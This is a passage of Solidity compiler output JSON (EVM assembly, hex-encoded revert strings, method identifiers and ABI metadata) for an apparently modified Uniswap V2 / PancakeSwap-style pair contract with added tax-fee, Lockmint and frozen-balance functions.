										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "DUP2"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "DUP3"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "DUP3"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "42455032303A206D696E7420746F20746865207A65726F206164647265737300"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "DUP3"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "MLOAD"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "DUP2"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "SUB"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "REVERT"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "tag",
											"value": "389"
										},
										{
											"begin": 1903,
											"end": 1968,
											"name": "JUMPDEST"
										},
										{
											"begin": 2058,
											"end": 2069,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2058,
											"end": 2069,
											"name": "SLOAD"
										},
										{
											"begin": 2058,
											"end": 2081,
											"name": "PUSH [tag]",
											"value": "390"
										},
										{
											"begin": 2058,
											"end": 2081,
											"name": "SWAP1"
										},
										{
											"begin": 2074,
											"end": 2080,
											"name": "DUP4"
										},
										{
											"begin": 2058,
											"end": 2081,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2058,
											"end": 2073,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 2058,
											"end": 2081,
											"name": "AND"
										},
										{
											"begin": 2058,
											"end": 2081,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2058,
											"end": 2081,
											"name": "tag",
											"value": "390"
										},
										{
											"begin": 2058,
											"end": 2081,
											"name": "JUMPDEST"
										},
										{
											"begin": 2044,
											"end": 2055,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2044,
											"end": 2081,
											"name": "SWAP1"
										},
										{
											"begin": 2044,
											"end": 2081,
											"name": "DUP2"
										},
										{
											"begin": 2044,
											"end": 2081,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "DUP5"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "AND"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "DUP2"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "MSTORE"
										},
										{
											"begin": 2117,
											"end": 2131,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "MSTORE"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "SWAP1"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "KECCAK256"
										},
										{
											"begin": 2117,
											"end": 2140,
											"name": "SLOAD"
										},
										{
											"begin": 2117,
											"end": 2152,
											"name": "PUSH [tag]",
											"value": "391"
										},
										{
											"begin": 2117,
											"end": 2152,
											"name": "SWAP1"
										},
										{
											"begin": 2145,
											"end": 2151,
											"name": "DUP4"
										},
										{
											"begin": 2117,
											"end": 2152,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2117,
											"end": 2144,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 2117,
											"end": 2152,
											"name": "AND"
										},
										{
											"begin": 2117,
											"end": 2152,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2117,
											"end": 2152,
											"name": "tag",
											"value": "391"
										},
										{
											"begin": 2117,
											"end": 2152,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "DUP5"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "AND"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "DUP2"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "DUP2"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "MSTORE"
										},
										{
											"begin": 2091,
											"end": 2105,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "SWAP1"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "DUP2"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "MSTORE"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "DUP1"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "DUP4"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "KECCAK256"
										},
										{
											"begin": 2091,
											"end": 2152,
											"name": "SWAP5"
										},
										{
											"begin": 2091,
											"end": 2152,
											"name": "SWAP1"
										},
										{
											"begin": 2091,
											"end": 2152,
											"name": "SWAP5"
										},
										{
											"begin": 2091,
											"end": 2152,
											"name": "SSTORE"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "DUP4"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "MLOAD"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "DUP7"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "DUP2"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "MSTORE"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "SWAP4"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "MLOAD"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "SWAP3"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "SWAP4"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "SWAP2"
										},
										{
											"begin": 2091,
											"end": 2114,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH data",
											"value": "ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "CODECOPY"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "MSTORE"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "SWAP3"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "DUP2"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "SWAP1"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "SUB"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "SWAP1"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "SWAP2"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "ADD"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "SWAP1"
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "LOG3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2221,
											"end": 2225,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1756,
											"end": 2232,
											"name": "SWAP3"
										},
										{
											"begin": 1756,
											"end": 2232,
											"name": "SWAP2"
										},
										{
											"begin": 1756,
											"end": 2232,
											"name": "POP"
										},
										{
											"begin": 1756,
											"end": 2232,
											"name": "POP"
										},
										{
											"begin": 1756,
											"end": 2232,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 319,
											"end": 437,
											"name": "tag",
											"value": "340"
										},
										{
											"begin": 319,
											"end": 437,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 394,
											"end": 404,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 394,
											"end": 411,
											"name": "MUL"
										},
										{
											"begin": 394,
											"end": 411,
											"name": "SWAP1"
										},
										{
											"begin": 319,
											"end": 437,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 505,
											"end": 611,
											"name": "tag",
											"value": "341"
										},
										{
											"begin": 505,
											"end": 611,
											"name": "JUMPDEST"
										},
										{
											"begin": 565,
											"end": 574,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 594,
											"end": 604,
											"name": "DUP3"
										},
										{
											"begin": 594,
											"end": 604,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "DUP5"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "AND"
										},
										{
											"begin": 594,
											"end": 604,
											"name": "DUP2"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "PUSH [tag]",
											"value": "394"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "JUMPI"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "INVALID"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "tag",
											"value": "394"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "JUMPDEST"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "DIV"
										},
										{
											"begin": 590,
											"end": 604,
											"name": "SWAP4"
										},
										{
											"begin": 505,
											"end": 611,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 505,
											"end": 611,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "tag",
											"value": "348"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "ADD"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "LT"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "ISZERO"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH [tag]",
											"value": "181"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "JUMPI"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6164642D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SUB"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "REVERT"
										}
									],
									".data": {
										"50B0A6DD250A09C1CD083AD4BF9F97424665D60E7BC0A208A1151C7D0051999C": "50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54",
										"6591C9F5BF1FEFAAD109B76A20E25C857B696080C952191F86220F001A83663E": "556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
										"6C050B0A8D3F2D18D11271EE0A551B7748437B8FA9A6165C561190D34A2947D6": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544",
										"ADA389E1FC24A8587C776340EFB91B36E675792AB631816100D55DF0B5CF3CBC": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
										"C654718515B5F98052EB92744D97D32CCCABF6E8B2BAE886738591C9B906CFD8": "50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54",
										"EF633320352A650C1D75752F13E6C73D8D8F7F26A5596A6D026C1BF50D2F7713": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544"
									}
								},
								"8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429"
							}
						},
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"FeeResiver()": "900820d8",
							"Lockmint(address)": "dcbbb373",
							"MINIMUM_LIQUIDITY()": "ba9a7a56",
							"PERMIT_TYPEHASH()": "30adf81f",
							"_frozenBalance(address)": "47d5d856",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"burn(address)": "89afcb44",
							"decimals()": "313ce567",
							"factory()": "c45a0155",
							"getReserves()": "0902f1ac",
							"initialize(address,address,uint256)": "1794bb3c",
							"kLast()": "7464fc3d",
							"mint(address)": "6a627842",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"price0CumulativeLast()": "5909c0d5",
							"price1CumulativeLast()": "5a3d5493",
							"skim(address)": "bc25cf77",
							"swap(uint256,uint256,address,bytes)": "022c0d9f",
							"symbol()": "95d89b41",
							"sync()": "fff6cae9",
							"taxfee()": "f317739c",
							"token0()": "0dfe1681",
							"token1()": "d21220a7",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"}],\"name\":\"Sync\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"FeeResiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Lockmint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MINIMUM_LIQUIDITY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_frozenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getReserves\",\"outputs\":[{\"internalType\":\"uint112\",\"name\":\"_reserve0\",\"type\":\"uint112\"},{\"internalType\":\"uint112\",\"name\":\"_reserve1\",\"type\":\"uint112\"},{\"internalType\":\"uint32\",\"name\":\"_blockTimestampLast\",\"type\":\"uint32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token0\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token1\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_taxfee\",\"type\":\"uint256\"}],\"name\":\"initialize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"kLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price0CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price1CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"skim\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sync\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"taxfee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\